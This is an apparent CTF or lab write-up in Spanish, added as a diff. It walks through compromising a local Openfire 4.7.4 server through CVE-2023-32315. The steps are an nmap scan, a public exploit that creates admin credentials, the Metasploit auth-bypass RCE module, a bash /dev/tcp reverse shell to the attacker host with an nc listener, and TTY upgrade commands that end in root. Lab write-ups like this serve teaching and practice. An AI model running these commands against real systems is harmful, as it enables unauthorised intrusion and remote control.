@@ -1,0 +1,60 @@
+# Enumeracion de Puertos, Servicios y versiones
+
+nmap -Pn -n -sS -p- -sV --script vuln --min-rate 5000 -vvv -oN nmap 172.17.0.2
+
+22/tcp   open  ssh            syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+5222/tcp open  jabber         syn-ack ttl 64
+5223/tcp open  ssl/hpvirtgrp? syn-ack ttl 64
+5262/tcp open  jabber         syn-ack ttl 64 Ignite Realtime Openfire Jabber server 3.10.0 or later
+5263/tcp open  ssl/unknown    syn-ack ttl 64
+5269/tcp open  xmpp           syn-ack ttl 64 Wildfire XMPP Client
+5270/tcp open  xmp?           syn-ack ttl 64
+5275/tcp open  jabber         syn-ack ttl 64 Ignite Realtime Openfire Jabber server 3.10.0 or later
+5276/tcp open  ssl/unknown    syn-ack ttl 64
+7070/tcp open  realserver?    syn-ack ttl 64
+7777/tcp open  socks5         syn-ack ttl 64 (No authentication; connection failed)
+9090/tcp open  zeus-admin?    syn-ack ttl 64
+
+vemos que existen muchos servicios corriendo, 
+revisamos el servicio web levantado por el puerto 7070
+y no conseguimos nada de interes, revisamos el puerto 9090
+y nos conseguimos con un panel de login de openfire version 4.7.4
+
+averiguando en internet podemos ver que la version es vulnerable y conseguimos un exploit en 
+https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT.git  
+nos clonamos el repositorio y ejecutamos el expoit
+
+python3 CVE-2023-32315.py -u http://172.17.0.2:9090 
+[+] Successfully added, here are the credentials
+[+] Username: hugme
+[+] Password: HugmeNOW
+
+ahora podemos loguearnos en la web..
+antes de loguearnos, revisamos si conseguiamos el CVE en metasploit y dimos con una de bypass y rce
+
+multi/http/openfire_auth_bypass_rce_cve_2023_32315
+
+asi que hacemos uso de este exploit con msfconsole y seteamos los siguientes valores
+
+set LHOST 172.17.0.1
+set RHOSTS 172.17.0.2
+exploit
+
+aqui ya ganamos accesos a la maquina como usuario root, pero para mi comodidad, me mande una reverse shell por netcat y trabajar mejor...
+
+
+- nc -lnvp 800					| me pongo en escucha desde mi maquina atacante 
+bash -i >& /dev/tcp/172.17.0.1/800 0>&1		| enviamos la shell reverse desde la consola que tenemos con metasploit
+
+tratamiento de la tty:
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+
+whoami
+# root
